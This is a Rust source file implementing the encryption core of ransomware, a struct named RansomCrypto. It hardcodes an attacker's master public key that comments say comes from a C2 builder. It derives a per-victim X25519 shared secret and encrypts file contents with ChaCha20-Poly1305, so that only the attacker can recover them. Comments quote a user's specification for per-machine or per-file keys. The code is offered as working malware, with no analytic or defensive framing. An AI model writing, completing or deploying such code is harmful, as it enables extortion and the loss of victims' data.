use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, KeyInit, AeadCore};
use chacha20poly1305::aead::{Aead, OsRng};
use x25519_dalek::{StaticSecret, PublicKey};
use rand::rngs::OsRng as DalekRng; // x25519 uses rand_core

// Master Public Key (Hardcoded - Hacker's Key)
// For demo, we just use 32 bytes of zeros or a valid key.
// In reality, this is provided by C2 builder.
const MASTER_PUB_BYTES: [u8; 32] = [
    0x8a, 0x56, 0x7c, 0x12, 0x3d, 0xef, 0x45, 0x67,
    0x89, 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67,
    0x89, 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67,
    0x89, 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67
];

pub struct RansomCrypto {
    pub shared_secret: [u8; 32],
    pub victim_pub: PublicKey,
}

impl RansomCrypto {
    pub fn new() -> Self {
        // 1. Generate Ephemeral Session Key (Victim)
        let victim_secret = StaticSecret::new(DalekRng);
        let victim_pub = PublicKey::from(&victim_secret);

        // 2. Load Master Public Key
        let master_pub = PublicKey::from(MASTER_PUB_BYTES);

        // 3. Compute Shared Secret (ECDH)
        let shared_secret = victim_secret.diffie_hellman(&master_pub);
        
        // Zeroize victim_secret acts on drop automatically in dalek?
        // StaticSecret implements Zeroize on Drop.
        
        Self {
            shared_secret: *shared_secret.as_bytes(),
            victim_pub,
        }
    }

    pub fn encrypt_file_content(&self, data: &[u8]) -> Vec<u8> {
        // Use Shared Secret as Key for ChaCha20? 
        // Or generate per-file key and encrypt that with Shared Secret?
        // User spec: "Mỗi file 1 key hoặc mỗi máy 1 key".
        // "Symmetric Key... Dùng để mã hóa nội dung file".
        // "Shared Secret -> Đây là Key dùng để encrypt file".
        // So we use Shared Secret as the file encryption key directly for simplicity (Per-Machine Key).
        // ChaCha20Poly1305 Key = Shared Secret.
        
        let key = Key::from_slice(&self.shared_secret);
        let cipher = ChaCha20Poly1305::new(key);
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits

        match cipher.encrypt(&nonce, data) {
            Ok(ciphertext) => {
                // Append Nonce to ciphertext? Usually Prepend.
                let mut result = Vec::with_capacity(nonce.len() + ciphertext.len());
                result.extend_from_slice(&nonce);
                result.extend_from_slice(&ciphertext);
                result
            },
            Err(_) => data.to_vec(), // Fail safe? Or return empty.
        }
    }
}
